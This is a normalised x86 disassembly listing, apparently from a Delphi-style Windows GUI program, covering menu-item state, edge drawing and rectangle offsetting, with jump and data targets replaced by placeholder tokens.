mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41cff4
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dbbc
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d99c
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_441f1c
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dbbc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41d7ec
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41cd28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4030f8
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_444c18
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44607f
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_443cdc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_41da1c
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_444c18
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_4461cc
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_446bb0
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_4461fc
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_446248
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_44642a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_4032f4
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_4461fc
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_446bb0
mov esi eax
mov eax edi
call sub_4461cc
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_4042c0
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402b04
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_403f4c
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_443cdc
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4041c0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446431
lea eax [ ebp - 0x24 ]
call sub_403eb4
lea eax [ ebp - 0x10 ]
call sub_403eb4
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_444c18
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_44645c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_4042c0
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403f08
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_446484
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4465f4
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_446604
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_4464cc
sub_4464cc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_444b88
push eax
call CheckMenuItem
mov eax esi
call sub_446484
sub_446520
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_4465f4
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_444b88
push eax
call EnableMenuItem
sub_446598
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_446958
mov edx eax
mov ecx ebx
mov eax edi
call sub_444b28
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_446484
sub_446604
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4139f4
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_443c30
sub_446674
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_4465f4
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_44665c
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_44698c
mov ecx ebx
mov edx esi
mov eax edi
call sub_446780
sub_4466bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4465f4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_446604
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_446714
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_4465f4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_446604
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_446604
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_446780
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_443c30
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_444b28
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_413a70
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_4469f8
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_4465f4
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_444a58
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4139f4
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4139f4
mov dl [ eax + 0x3f ]
mov eax esi
call sub_446598
sub_446834
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_443c30
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_4465f4
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_444a58
mov eax ebx
call sub_4465f4
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4139f4
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4138e4
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_4468a8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_4464cc
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4465dc
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_4465dc
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_446970
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4465f4
mov edx eax
mov ecx esi
mov eax ebx
call sub_446780
pop esi
pop ebx
retn
sub_44698c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_446958
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_446834
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_443c30
sub_4469b4
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_4469f8
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_4469f8
jmp r-xdata
mov eax ebx
call sub_444a58
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_4486d0
sub_446a50
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202b4
mov [ ebx + 0x4c ] eax
sub_446a78
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_4030f8
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_446d0c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_4032f4
mov edx ebx
mov eax edi
call sub_419dac
mov eax ebx
mov si 0xffee
call sub_4032f4
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_446ae8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202b4
mov [ esi + 0x4c ] eax
sub_446b1c
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_4465f4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_446604
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_446b5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44698c
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_446970
jmp r-xdata
mov edx ebx
mov eax esi
call sub_446970
sub_446bc0
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_446484
sub_446bec
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_44645c
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_4464cc
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_446520
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403f08
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_44664c
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_446598
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_446628
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_44663c
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_446d0c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4465dc
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_4032f4
sub_446d30
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_446d50
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_446d70
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_446d90
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_446db0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_446dd0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_446df0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_446e10
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_446e30
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_446e50
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414110
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_441158
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_441290
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_4412f0
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_440ff0
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_4413b0
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_446ec8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419ff8
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4465dc
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_446a78
jmp r-xdata
